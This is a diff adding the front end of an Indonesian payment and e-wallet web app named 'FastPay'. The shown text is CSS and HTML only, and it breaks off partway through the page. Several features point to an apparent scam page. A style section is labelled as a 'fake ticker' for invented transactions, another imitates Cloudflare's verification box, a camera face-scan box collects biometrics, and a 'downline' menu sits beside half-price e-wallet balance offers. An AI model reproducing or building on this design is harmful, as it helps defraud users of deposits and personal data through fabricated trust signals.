@@ -1,0 +1,2396 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FastPay - PPOB & Pembayaran Cerdas</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
+    <style>
+        :root {
+            --bg-body: #0b0e14;
+            --bg-container: #12161f;
+            --bg-card: #1c212d;
+            --bg-input: #252b3b;
+            --text-main: #ffffff;
+            --text-muted: #94a3b8;
+            --border-color: #2e364f;
+            --primary: #3b82f6; 
+            --primary-hover: #2563eb;
+            --success: #10b981;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+            --overlay: rgba(0,0,0,0.85);
+            --card-radius: 20px;
+        }
+
+        [data-theme="light"] {
+            --bg-body: #f1f5f9;
+            --bg-container: #ffffff;
+            --bg-card: #ffffff;
+            --bg-input: #f8fafc;
+            --text-main: #0f172a;
+            --text-muted: #64748b;
+            --border-color: #e2e8f0;
+            --overlay: rgba(0,0,0,0.6);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { background-color: var(--bg-body); color: var(--text-main); display: flex; justify-content: center; transition: background 0.3s ease; scroll-behavior: smooth;}
+        
+        .app-container { width: 100%; max-width: 480px; background-color: var(--bg-container); min-height: 100vh; position: relative; padding-top: 75px; padding-bottom: 30px; transition: background 0.3s ease; overflow-x: hidden;}
+        
+        .top-bar { position: fixed; top: 0; width: 100%; max-width: 480px; height: 65px; background: rgba(28, 33, 45, 0.8); backdrop-filter: blur(10px); display: flex; align-items: center; justify-content: space-between; padding: 0 15px; z-index: 1000; border-bottom: 1px solid var(--border-color); gap: 12px;}
+        [data-theme="light"] .top-bar { background: rgba(255, 255, 255, 0.9); }
+        .btn-icon { background: transparent; border: none; color: var(--text-main); font-size: 22px; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: transform 0.2s; position: relative; }
+        .btn-icon:active { transform: scale(0.9); }
+        
+        .search-box { display: flex; align-items: center; background: var(--bg-input); padding: 10px 14px; border-radius: 14px; flex: 1; border: 1px solid transparent; transition: all 0.3s ease; }
+        .search-box:focus-within { border-color: var(--primary); }
+        .search-box i { color: var(--text-muted); font-size: 14px; }
+        .search-box input { background: transparent; border: none; outline: none; color: var(--text-main); width: 100%; margin-left: 8px; font-size: 13px; font-weight: 500; }
+
+        .header-actions { display: flex; gap: 14px; align-items: center; flex-shrink: 0; }
+        .badge-dot { position: absolute; top: 2px; right: 2px; width: 8px; height: 8px; background: var(--danger); border-radius: 50%; border: 1px solid var(--bg-container); }
+
+        /* Sidenav */
+        .sidenav-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--overlay); z-index: 1001; display: none; opacity: 0; transition: opacity 0.3s ease; }
+        .sidenav-overlay.show { display: block; opacity: 1; }
+        .sidenav { position: fixed; top: 0; left: -280px; width: 280px; height: 100%; background: var(--bg-card); z-index: 1002; transition: left 0.3s ease; display: flex; flex-direction: column; }
+        .sidenav.open { left: 0; }
+        .sidenav-header { padding: 25px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-color); }
+        .sidenav-header h3 { font-size: 20px; color: var(--primary); font-weight: 800; letter-spacing: -0.5px;}
+        
+        .sidenav-profile { padding: 20px; border-bottom: 1px solid var(--border-color); display: none; align-items: center; gap: 15px; background: linear-gradient(135deg, rgba(59, 130, 246, 0.1), transparent); }
+        .sidenav-profile i { font-size: 42px; color: var(--primary); }
+        .sidenav-profile-info { display: flex; flex-direction: column; width: 100%; }
+        .sidenav-profile-name { font-size: 16px; font-weight: 700; color: var(--text-main); }
+        .sidenav-profile-badge { font-size: 11px; padding: 4px 8px; border-radius: 6px; font-weight: 700; margin-top: 6px; display: inline-block; width: max-content;}
+        .badge-verified { background: rgba(16, 185, 129, 0.1); color: var(--success); border: 1px solid var(--success);}
+        .badge-unverified { background: rgba(245, 158, 11, 0.1); color: var(--warning); border: 1px solid var(--warning);}
+        .badge-rejected { background: rgba(239, 68, 68, 0.1); color: var(--danger); border: 1px solid var(--danger);}
+
+        .sidenav-menu { display: flex; flex-direction: column; padding: 15px 20px; gap: 6px; overflow-y: auto; flex: 1; }
+        .sidenav-menu a { color: var(--text-main); text-decoration: none; font-size: 14px; font-weight: 600; display: flex; align-items: center; gap: 12px; padding: 12px; border-radius: 12px; transition: background 0.2s; cursor: pointer; }
+        .sidenav-menu a:hover { background: var(--bg-input); color: var(--primary); }
+        .sidenav-menu i { font-size: 18px; color: var(--text-muted); width: 20px; text-align: center;}
+        
+        #nav-auth-links, #nav-logout-link { display: none; flex-direction: column; gap: 6px; }
+
+        /* Security Bar Protection Modern UI */
+        .security-protection-bar {
+            margin: 15px 20px 0 20px;
+            background: linear-gradient(145deg, #1e2532 0%, #151a23 100%);
+            border: 1px solid rgba(255,255,255,0.05);
+            border-radius: 16px;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+            position: relative;
+            overflow: hidden;
+        }
+        [data-theme="light"] .security-protection-bar {
+            background: linear-gradient(145deg, #ffffff 0%, #f1f5f9 100%);
+            border: 1px solid var(--border-color);
+        }
+        .security-protection-bar::before {
+            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
+            background: radial-gradient(circle, rgba(59,130,246,0.05) 0%, transparent 70%); pointer-events: none;
+        }
+        .sec-icon-wrap {
+            width: 42px; height: 42px; border-radius: 12px; background: rgba(16, 185, 129, 0.1); 
+            display: flex; align-items: center; justify-content: center; font-size: 20px; color: var(--success); flex-shrink: 0;
+            border: 1px solid rgba(16, 185, 129, 0.2);
+        }
+        .sec-progress-container { flex: 1; z-index: 1;}
+        .sec-title-flex { display: flex; justify-content: space-between; font-size: 12px; font-weight: 700; margin-bottom: 8px; }
+        .sec-progress-bg { height: 6px; background: var(--bg-input); border-radius: 4px; overflow: hidden; }
+        .sec-progress-fill { height: 100%; width: 80%; background: linear-gradient(90deg, #f59e0b, #ef4444); transition: all 0.5s ease; }
+        .sec-progress-fill.full { background: linear-gradient(90deg, #10b981, #3b82f6); }
+        .btn-sec-act {
+            padding: 8px 16px; background: linear-gradient(135deg, var(--primary), #2563eb);
+            border: none; border-radius: 10px; color: #fff; font-size: 12px; font-weight: 700; cursor: pointer; 
+            transition: transform 0.2s; z-index: 1;
+        }
+        .btn-sec-act:active { transform: scale(0.95); }
+
+        /* Balance Card */
+        .balance-card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: var(--card-radius); margin: 15px 20px 25px 20px; padding: 25px; position: relative; overflow: hidden; }
+        .balance-header { position: relative; z-index: 1; margin-bottom: 20px; }
+        .balance-label { display: flex; justify-content: space-between; align-items: center; font-size: 13px; font-weight: 600; margin-bottom: 8px; color: var(--text-muted);}
+        .balance-amount-wrapper { display: flex; align-items: center; gap: 15px; }
+        .balance-amount { font-size: 32px; font-weight: 800; letter-spacing: -1px; color: var(--text-main);}
+        
+        .balance-actions { display: flex; gap: 12px; position: relative; z-index: 1; }
+        .btn-action { flex: 1; padding: 12px; border-radius: 14px; border: none; font-weight: 700; font-size: 13px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: all 0.1s;}
+        .btn-action:active { transform: scale(0.96); }
+        .btn-action-primary { background: var(--primary); color: #fff; }
+        .btn-action-secondary { background: var(--bg-input); color: var(--text-main); border: 1px solid var(--border-color); }
+
+        /* Services Grid */
+        .services-section { padding: 0 20px; margin-bottom: 30px; }
+        .section-title { font-size: 16px; font-weight: 700; margin-bottom: 15px; color: var(--text-main); display: flex; justify-content: space-between; align-items: center; letter-spacing: -0.3px;}
+        
+        .service-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px 10px; }
+        .service-item { display: flex; flex-direction: column; align-items: center; gap: 10px; cursor: pointer; transition: transform 0.2s;}
+        .service-item:active { transform: scale(0.95); }
+        .service-icon { width: 52px; height: 52px; border-radius: 16px; background: var(--bg-input); display: flex; align-items: center; justify-content: center; font-size: 22px; color: var(--primary); border: 1px solid transparent;}
+        .service-item:hover .service-icon { background: rgba(59,130,246,0.1); border-color: rgba(59,130,246,0.2); }
+        .service-name { font-size: 12px; font-weight: 600; color: var(--text-main); text-align: center; }
+
+        /* Animasi Fake Ticker */
+        @keyframes slideInDown {
+            from { transform: translateY(-20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        .fake-ticker-container { display: flex; flex-direction: column; }
+        .fake-ticker-item { 
+            display: flex; align-items: center; justify-content: space-between; 
+            background: var(--bg-card); padding: 12px; border-radius: 12px; 
+            margin-bottom: 8px; border: 1px solid var(--border-color); 
+            animation: slideInDown 0.4s cubic-bezier(0.25, 1, 0.5, 1) forwards;
+        }
+        .fake-ticker-icon { width: 35px; height: 35px; object-fit: contain; border-radius: 8px; background:#fff; padding: 4px;}
+        .fake-ticker-info { flex: 1; margin-left: 12px; }
+        .fake-ticker-info h4 { font-size: 13px; font-weight: 700; color: var(--text-main); margin-bottom: 4px; }
+        .fake-ticker-info p { font-size: 11px; color: var(--text-muted); }
+        .fake-ticker-status { text-align: right; }
+        .fake-ticker-status .amount { font-size: 13px; font-weight: 800; margin-bottom: 4px; color: var(--text-main); }
+        .fake-ticker-status .status { font-size: 10px; font-weight: 800; padding: 3px 8px; border-radius: 6px; display: inline-block; }
+        .status-pending { background: rgba(245,158,11,0.1); color: var(--warning); border: 1px solid var(--warning); }
+        .status-success { background: rgba(16,185,129,0.1); color: var(--success); border: 1px solid var(--success); }
+
+        /* Auto Slider Banners & App Info*/
+        .banner-slider-container { padding: 0 20px; margin-bottom: 25px; }
+        .banner-slider { overflow: hidden; border-radius: 16px; width: 100%; position: relative; }
+        .banner-slides { display: flex; transition: transform 0.5s ease; width: 100%; }
+        .banner-slides img { width: 100%; height: 100%; object-fit: cover; flex-shrink: 0; border-radius: 16px; border: 1px solid var(--border-color); }
+        
+        .app-info-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; }
+        .info-card-app { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 16px; padding: 15px; display: flex; align-items: center; gap: 12px; }
+        .info-card-app img { width: 35px; height: auto; object-fit: contain; flex-shrink: 0;}
+        .info-card-text h5 { font-size: 12px; color: var(--text-main); margin-bottom: 3px; font-weight: 700; }
+        .info-card-text p { font-size: 10px; color: var(--text-muted); font-weight: 500; }
+
+        /* Flash Sale Modern Cards */
+        .fs-title-container { display: flex; align-items: center; gap: 8px; flex: 1; }
+        .fs-header-right { display: flex; align-items: center; gap: 10px; }
+        .flashsale-grid { display: flex; gap: 15px; overflow-x: auto; scroll-snap-type: x mandatory;}
+        .flashsale-grid::-webkit-scrollbar { display: none; }
+        
+        .fs-item {
+            min-width: 170px;
+            background: var(--bg-card);
+            border-radius: 18px;
+            padding: 0;
+            border: 1px solid var(--border-color);
+            scroll-snap-align: start;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            transition: transform 0.2s;
+        }
+        .fs-header-img {
+            height: 90px; 
+            background-size: cover !important;
+            background-position: center !important;
+            display: flex; align-items: flex-start; justify-content: flex-start; 
+            position: relative;
+        }
+        .fs-badge {
+            position: absolute; top: 10px; left: 10px; 
+            background: rgba(0,0,0,0.5); backdrop-filter: blur(5px); 
+            color: #fff; font-size: 9px; font-weight: 800; 
+            padding: 4px 8px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.3);
+        }
+        .fs-content { padding: 12px; display:flex; flex-direction: column; flex: 1; }
+        .fs-name { font-size: 14px; font-weight: 700; color: var(--text-main); margin-bottom: 4px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;}
+        .fs-price-strike { font-size: 11px; color: var(--text-muted); text-decoration: line-through;}
+        .fs-price { font-size: 16px; color: var(--danger); font-weight: 800; margin-bottom: 12px; flex: 1;}
+        .fs-add-btn {
+            width: 100%; padding: 10px; border-radius: 12px; background: rgba(239, 68, 68, 0.1); color: var(--danger); border: none; cursor: pointer; font-weight: 700; font-size: 12px; transition: all 0.2s;
+        }
+        .fs-add-btn:active { background: rgba(239, 68, 68, 0.2); transform: scale(0.97); }
+
+        /* Auth/Inputs */
+        .pass-input-wrapper { position: relative; width: 100%; }
+        .pass-input-wrapper input { padding-right: 45px !important; }
+        .pass-toggle-icon { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: var(--text-muted); cursor: pointer; font-size: 18px; }
+        
+        .auth-link { text-align: center; font-size: 13px; color: var(--primary); margin-top: 15px; cursor: pointer; font-weight: 600; text-decoration: none; }
+        .auth-link span { text-decoration: underline; }
+
+        /* History */
+        .history-list { display: flex; flex-direction: column; gap: 12px; margin-top: 5px; }
+        .history-item { display: flex; align-items: center; justify-content: space-between; padding: 16px; background: var(--bg-card); border-radius: 16px; border: 1px solid var(--border-color); }
+        .hist-info { flex: 1; margin-left: 15px; }
+        .hist-info h4 { font-size: 14px; font-weight: 700; margin-bottom: 4px; color: var(--text-main); }
+        .hist-info p { font-size: 12px; color: var(--text-muted); }
+        .hist-result { text-align: right; }
+        .hist-result h4 { font-size: 14px; font-weight: 700; margin-bottom: 4px; }
+        .hist-result p { font-size: 13px; font-weight: 700; }
+        
+        .text-success { color: var(--success); }
+        .text-danger { color: var(--danger); }
+        .text-warning { color: var(--warning); }
+
+        /* Modals */
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--overlay); display: none; justify-content: center; align-items: center; z-index: 9999; opacity: 0; transition: opacity 0.3s ease; backdrop-filter: blur(5px);}
+        .modal-overlay.show { display: flex; opacity: 1; }
+        .modal-content { background: var(--bg-container); width: 90%; max-width: 420px; padding: 25px; border-radius: 24px; text-align: left; transform: translateY(20px) scale(0.95); transition: all 0.3s cubic-bezier(0.25, 1, 0.5, 1); border: 1px solid var(--border-color); max-height: 90vh; overflow-y: auto;}
+        .modal-overlay.show .modal-content { transform: translateY(0) scale(1); }
+        
+        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .modal-header h3 { color: var(--text-main); font-size: 18px; margin: 0; }
+        .modal-header .btn-icon { font-size: 24px; background: var(--bg-input); width: 36px; height: 36px; border-radius: 50%; color: var(--text-muted); }
+
+        .input-group { margin-bottom: 16px; }
+        .input-group label { display: block; font-size: 13px; color: var(--text-muted); margin-bottom: 8px; font-weight: 600; }
+        .input-group input, .input-group select { width: 100%; padding: 14px 16px; background: var(--bg-input); color: var(--text-main); border: 1px solid transparent; border-radius: 14px; font-size: 14px; font-weight: 600; outline: none; transition: all 0.3s; }
+        .input-group input:focus, .input-group select:focus { border-color: var(--primary); background: var(--bg-card); }
+        
+        .btn-modal { width: 100%; padding: 15px; background: var(--primary); color: #fff; border: none; border-radius: 14px; font-weight: 700; font-size: 15px; cursor: pointer; margin-top: 10px; transition: all 0.2s; text-align: center;}
+        .btn-modal:active { transform: scale(0.98); }
+        .btn-modal-outline { background: transparent; color: var(--text-main); border: 1px solid var(--border-color); box-shadow: none; }
+        .btn-modal-danger { background: rgba(239, 68, 68, 0.1); color: var(--danger); border: 1px solid rgba(239, 68, 68, 0.2); box-shadow: none; }
+
+        /* Quick Nominals Deposit */
+        .quick-nominal-btn {
+            flex: 1; min-width: 30%; padding: 10px 5px;
+            background: var(--bg-input); color: var(--text-main);
+            border: 1px solid var(--border-color); border-radius: 12px;
+            font-size: 12px; font-weight: 700; cursor: pointer;
+            transition: all 0.2s; text-align: center;
+        }
+        .quick-nominal-btn:hover { border-color: var(--primary); background: rgba(59,130,246,0.1); color: var(--primary); }
+        .quick-nominal-btn:active { transform: scale(0.95); }
+
+        /* Payment Gateway Methods */
+        .payment-card { padding: 15px; border-radius: 14px; border: 2px solid var(--border-color); background: var(--bg-input); transition: all 0.2s; }
+        .payment-card.active { border-color: var(--primary); background: rgba(59,130,246,0.05); }
+        .payment-card.disabled { opacity: 0.6; cursor: not-allowed; }
+        
+        /* CF Captcha Modern Cloudflare Look */
+        .cf-captcha-box { display: flex; align-items: center; justify-content: space-between; border: 1px solid #d3d3d3; background: #fafafa; padding: 12px 16px; border-radius: 4px; margin-bottom: 20px; cursor: pointer; height: 70px; }
+        [data-theme="dark"] .cf-captcha-box { background: #1a1a1a; border-color: #333; }
+        .cf-checkbox { width: 30px; height: 30px; border: 2px solid #ccc; border-radius: 4px; display: flex; align-items: center; justify-content: center; background: #fff; transition: all 0.3s ease; position: relative; }
+        [data-theme="dark"] .cf-checkbox { background: #222; border-color: #555; }
+        .cf-checkbox i { color: #00c853; font-size: 22px; display: none; font-weight: bold; }
+        .cf-checkbox.loading { border-color: transparent; border-top-color: #f6821f; border-right-color: transparent; border-radius: 50%; animation: spin 1s linear infinite; background: transparent; }
+        .cf-checkbox.verified { border-color: transparent; background: transparent; }
+        .cf-checkbox.verified i { display: block; animation: cf-pop 0.3s ease-out forwards; }
+        @keyframes cf-pop { 0% { transform: scale(0.5); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+        .cf-text-wrap { display: flex; flex-direction: column; }
+        .cf-text-wrap span { font-size: 14px; font-weight: 500; color: #333; font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;}
+        [data-theme="dark"] .cf-text-wrap span { color: #eee; }
+        .cf-text-wrap small { font-size: 11px; color: #888; margin-top: 2px; }
+        .cf-logo-box { display: flex; flex-direction: column; align-items: center; gap: 4px; }
+        .cf-logo-box span { font-size: 10px; color: #999; }
+
+        /* Iframe Help Desk View System - Fullscreen Baru */
+        .help-modal-fullscreen {
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            background: #ffffff; display: flex; flex-direction: column;
+            transform: translateY(100%); transition: transform 0.3s cubic-bezier(0.25, 1, 0.5, 1);
+            z-index: 10000;
+        }
+        .modal-overlay.show .help-modal-fullscreen { transform: translateY(0); }
+        .help-header {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 15px 20px; background: var(--bg-container); border-bottom: 1px solid #e2e8f0;
+        }
+        .help-iframe-view { flex: 1; width: 100%; height: 100%; border: none; }
+        @keyframes blink-dot { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+
+        /* Struk Bukti Flashsale */
+        .receipt-box { background: #ffffff; color: #1e293b; padding: 20px; border-radius: 16px; font-family: 'Courier New', Courier, monospace; border: 1px dashed #cbd5e1; margin: 15px 0; font-size: 13px; }
+        .receipt-header { text-align: center; font-weight: bold; font-size: 16px; margin-bottom: 15px; border-bottom: 1px dashed #94a3b8; padding-bottom: 10px; }
+        .receipt-row { display: flex; justify-content: space-between; margin-bottom: 6px; }
+        .receipt-footer { border-top: 1px dashed #94a3b8; margin-top: 15px; padding-top: 10px; text-align: center; font-weight: bold; }
+
+        .notif-popup-item { padding: 14px; border-radius: 14px; background: var(--bg-input); margin-bottom: 12px; border: 1px solid var(--border-color); position: relative; }
+        .btn-claim-bonus { padding: 8px 16px; background: var(--success); border: none; border-radius: 8px; color: #fff; font-weight: 700; font-size: 12px; cursor: pointer; margin-top: 8px; display: inline-block; }
+
+        .loading-spinner { border: 4px solid var(--border-color); border-top: 4px solid var(--primary); border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .face-scan-box { width: 220px; height: 260px; border: 5px solid var(--primary); border-radius: 50%; margin: 20px auto; overflow: hidden; background: #000; }
+        .face-scan-box video { width: 100%; height: 100%; object-fit: cover; }
+
+        .history-modal-content { background: var(--bg-container); width: 100%; max-width: 480px; height: 100vh; padding: 20px; display: flex; flex-direction: column; transform: translateY(100%); transition: transform 0.3s ease; }
+        .modal-overlay.show .history-modal-content { transform: translateY(0); }
+        
+        .toast-notif { position: fixed; top: -100px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 440px; background: var(--bg-card); color: var(--text-main); padding: 16px; border-radius: 16px; z-index: 10000; transition: top 0.4s ease; border-left: 4px solid var(--primary); display: flex; align-items: center; gap: 15px; }
+        .toast-notif.show { top: 25px; }
+        
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-thumb { background: var(--border-color); border-radius: 10px; }
+    </style>
+</head>
+<body>
+
+    <div id="maintenance-modal" class="modal-overlay" style="z-index: 99999; background: var(--bg-body);">
+        <div style="text-align: center; padding: 20px;">
+            <i class="bi bi-gear-wide-connected" style="font-size: 65px; color: var(--warning); display: block; margin-bottom: 20px; animation: spin 3s linear infinite;"></i>
+            <h2 style="margin-bottom: 10px; color: var(--text-main);">Sistem Maintenance</h2>
+            <p style="color: var(--text-muted); font-size: 14px; max-width: 300px; line-height: 1.5;">Sistem sedang dalam perbaikan, mohon maaf atas ketidaknyamanan ini.</p>
+        </div>
+    </div>
+
+    <div class="sidenav-overlay" id="sidenav-overlay" onclick="toggleNav()"></div>
+    <div class="sidenav" id="sidenav">
+        <div class="sidenav-header">
+            <h3><i class="bi bi-lightning-charge-fill"></i> DIGITAL</h3>
+            <button class="btn-icon" onclick="toggleNav()"><i class="bi bi-x-lg"></i></button>
+        </div>
+        
+        <div class="sidenav-profile" id="nav-user-info">
+            <i class="bi bi-person-circle"></i>
+            <div class="sidenav-profile-info">
+                <span class="sidenav-profile-name" id="nav-username">User</span>
+                <span style="font-size: 12px; color: var(--text-muted); margin-top:2px;" id="nav-phone">0812...</span>
+                <div style="display: flex; gap: 5px; align-items: center; flex-wrap: wrap;">
+                    <span class="sidenav-profile-badge badge-unverified" id="nav-profile-badge">Not Verified</span>
+                </div>
+            </div>
+        </div>
+<span id="nav-membership-badge" style="
+    display: none; justify-content: center; align-items: center; font-size: 14px; padding: 7px; background: rgba(59,130,246,0.2); color: var(--primary); border-bottom: 1px solid var(--border-color); font-weight: 800;
+">Standar</span>
+        <div class="sidenav-menu">
+            <a href="#" onclick="toggleNav()"><i class="bi bi-house-door"></i> <span>Beranda</span></a>
+            <a href="#" onclick="toggleNav(); openDepositModal();"><i class="bi bi-wallet2"></i> <span>Isi Saldo</span></a>
+            <a href="#" onclick="toggleNav(); openWithdrawModal();"><i class="bi bi-send"></i> <span>Transfer Dana</span></a>
+            <a href="#" onclick="toggleNav(); showFullHistory();"><i class="bi bi-clock-history"></i> <span>Riwayat Transaksi</span></a>
+            <a href="#" id="menu-downline" style="display: none;" onclick="toggleNav(); openDownlineModal();"><i class="bi bi-people"></i> <span>Menu Downline</span></a>
+            <a href="#" id="menu-ubah-password" style="display: none;" onclick="toggleNav(); openChangePasswordModal();"><i class="bi bi-shield-lock"></i> <span>Ubah Password</span></a>
+            <a href="#" onclick="toggleNav(); openHelpModal();"><i class="bi bi-headset"></i> <span>Customer Support</span></a>
+            <hr style="border: 0; border-top: 1px solid var(--border-color); margin: 5px 0;">
+            
+            <div id="nav-auth-links">
+                <a href="#" onclick="toggleNav(); openLoginModal();"><i class="bi bi-box-arrow-in-right"></i> <span>Masuk / Login</span></a>
+                <a href="#" onclick="toggleNav(); openRegisterModal();"><i class="bi bi-person-plus"></i> <span>Daftar Akun Baru</span></a>
+            </div>
+            
+            <div id="nav-logout-link">
+                <a href="#" id="nav-verif-btn" style="color: var(--primary);"><i id="nav-verif-icon" class="bi bi-person-vcard"></i> <span id="nav-verif-text">Verifikasi Akun</span></a>
+                <a href="#" onclick="toggleNav(); handleLogout();" style="color: var(--danger);"><i class="bi bi-box-arrow-right"></i> <span>Keluar Akun</span></a>
+            </div>
+        </div>
+    </div>
+
+    <div class="app-container">
+        <div class="top-bar">
+            <button class="btn-icon" onclick="toggleNav()"><i class="bi bi-list"></i></button>
+            <div class="search-box">
+                <i class="bi bi-search"></i>
+                <input type="text" id="service-search" placeholder="Cari layanan..." onkeyup="searchService()">
+            </div>
+            <div class="header-actions">
+                <button class="btn-icon" onclick="openNotifModal()">
+                    <i class="bi bi-bell"></i>
+                    <span id="notif-badge-dot" class="badge-dot" style="display:none;"></span>
+                </button>
+                <button class="btn-icon" id="cart-icon-btn" onclick="openCartModal()">
+                    <i class="bi bi-cart3"></i>
+                    <span id="cart-badge" style="display:none; position:absolute; top: -4px; right: -6px; font-size:10px; background:var(--danger); color:#fff; border-radius:50%; padding: 2px 6px; font-weight:bold;">0</span>
+                </button>
+                <button class="btn-icon" onclick="toggleTheme()"><i class="bi bi-moon-stars" id="theme-icon"></i></button>
+            </div>
+        </div>
+
+        <div class="balance-card">
+            <div class="balance-header">
+                <div class="balance-label">
+                    <span>Total Saldo</span>
+                    <span style="display: flex; gap: 8px; align-items: center;">
+                        <span id="user-id-display" style="background: var(--bg-container); padding: 4px 10px; border-radius: 8px; font-size: 11px; font-weight: bold;">UID: -</span>
+                        <i class="bi bi-eye-slash text-muted" id="btn-hide-balance" style="cursor: pointer; font-size: 16px;" onclick="toggleHideBalance()"></i>
+                    </span>
+                </div>
+                <div class="balance-amount" id="balance-display">Rp 0</div>
+            </div>
+            <div class="balance-actions">
+                <button class="btn-action btn-action-primary" onclick="openDepositModal()">
+                    <i class="bi bi-plus-lg"></i> Isi Saldo
+                </button>
+                <button class="btn-action btn-action-secondary" onclick="openWithdrawModal()">
+                    <i class="bi bi-box-arrow-up-right"></i> Tarik Saldo
+                </button>
+            </div>
+        </div>
+        
+        <div class="security-protection-bar" id="security-bar" style="display: none;">
+            <div class="sec-icon-wrap"><i class="bi bi-shield-lock-fill"></i></div>
+            <div class="sec-progress-container">
+                <div class="sec-title-flex">
+                    <span style="color: var(--text-main);">Keamanan Akun</span>
+                    <span id="sec-percentage" style="color: var(--warning);">80%</span>
+                </div>
+                <div class="sec-progress-bg">
+                    <div id="sec-progress-fill" class="sec-progress-fill"></div>
+                </div>
+            </div>
+            <button class="btn-sec-act" id="btn-setup-pin" onclick="openPinSetupModal()">Buat PIN</button>
+        </div>
+        <br/>
+        
+        <div class="services-section" id="section-ppob">
+            <div class="section-title"></div>
+            <div class="service-grid">
+                <div class="service-item" onclick="openPPOBModal('Pulsa')">
+                    <div class="service-icon"><i class="bi bi-phone"></i></div>
+                    <div class="service-name">Pulsa</div>
+                </div>
+                <div class="service-item" onclick="openPPOBModal('Paket Data')">
+                    <div class="service-icon"><i class="bi bi-wifi"></i></div>
+                    <div class="service-name">Paket Data</div>
+                </div>
+                <div class="service-item" onclick="openPPOBModal('PLN')">
+                    <div class="service-icon"><i class="bi bi-lightning-charge"></i></div>
+                    <div class="service-name">Token PLN</div>
+                </div>
+                <div class="service-item" onclick="openPPOBModal('Voucher Game')">
+                    <div class="service-icon"><i class="bi bi-controller"></i></div>
+                    <div class="service-name">Games</div>
+                </div>
+                <div class="service-item" onclick="openPPOBModal('E-Wallet')">
+                    <div class="service-icon"><i class="bi bi-wallet2"></i></div>
+                    <div class="service-name">E-Wallet</div>
+                </div>
+                <div class="service-item" onclick="openPPOBModal('PDAM')">
+                    <div class="service-icon"><i class="bi bi-droplet"></i></div>
+                    <div class="service-name">PDAM Air</div>
+                </div>
+                <div class="service-item" onclick="openPPOBModal('BPJS')">
+                    <div class="service-icon"><i class="bi bi-heart-pulse"></i></div>
+                    <div class="service-name">BPJS</div>
+                </div>
+                <div class="service-item" onclick="openPPOBModal('Lainnya')">
+                    <div class="service-icon"><i class="bi bi-grid"></i></div>
+                    <div class="service-name">Lainnya</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="services-section" id="section-flashsale">
+            <div class="section-title">
+                <div class="fs-title-container">
+                    <span style="color: var(--danger);"><i class="bi bi-fire"></i> Flash Sale</span>
+                    <span id="flashsale-timer" style="font-size:11px; background:var(--danger); color:#fff; padding:4px 10px; border-radius:8px; font-weight:700;">-</span>
+                </div>
+                <div class="fs-header-right">
+                    <i class="bi bi-arrow-right-short" style="font-size: 24px; color: var(--primary); cursor: pointer;" onclick="showModal('Informasi','Promo flashsale khusus pengguna baru.', 'info')"></i>
+                </div>
+            </div>
+            <div class="flashsale-grid">
+                <div class="fs-item">
+                    <div class="fs-header-img" style="background-image: url('https://cdn25.metrotvnews.com/content/2025/09/09/KvJCL6xJ/t_68bfe45e6ea64.jpg">
+                        <div class="fs-badge"><i class="bi bi-lightning-fill"></i> CASHBACK</div>
+                    </div>
+                    <div class="fs-content">
+                        <div style="display: flex; justify-content: center; align-items: center; font-size: 10px; padding: 6px; background: rgba(59,130,246,0.2); color: var(--primary); border-bottom: 1px solid var(--border-color); font-weight: 800; margin: -12px -12px 10px -12px;">PENGGUNA BARU</div>
+                        <div class="fs-name">Saldo E-Wallet</div>
+                        <div class="fs-price-strike">Rp 200.000</div>
+                        <div class="fs-price">Rp 100.000</div>
+                        <button class="fs-add-btn" onclick="addFlashsaleToCart('E-Wallet Flashsale', 200000, 100000, '26583')">+ Keranjang</button>
+                    </div>
+                </div>
+                <div class="fs-item">
+                    <div class="fs-header-img" style="background-image: url('https://cdn25.metrotvnews.com/content/2025/09/09/KvJCL6xJ/t_68bfe45e6ea64.jpg">
+                        <div class="fs-badge"><i class="bi bi-lightning-fill"></i> BIFAST</div>
+                    </div>
+                    <div class="fs-content">
+                        <div style="display: flex; justify-content: center; align-items: center; font-size: 10px; padding: 6px; background: rgba(59,130,246,0.2); color: var(--primary); border-bottom: 1px solid var(--border-color); font-weight: 800; margin: -12px -12px 10px -12px;">PENGGUNA BARU</div>
+                        <div class="fs-name">Saldo E-Wallet</div>
+                        <div class="fs-price-strike">Rp 500.000</div>
+                        <div class="fs-price">Rp 250.000</div>
+                        <button class="fs-add-btn" onclick="addFlashsaleToCart('E-Wallet Flashsale', 500000, 250000, '49263')">+ Keranjang</button>
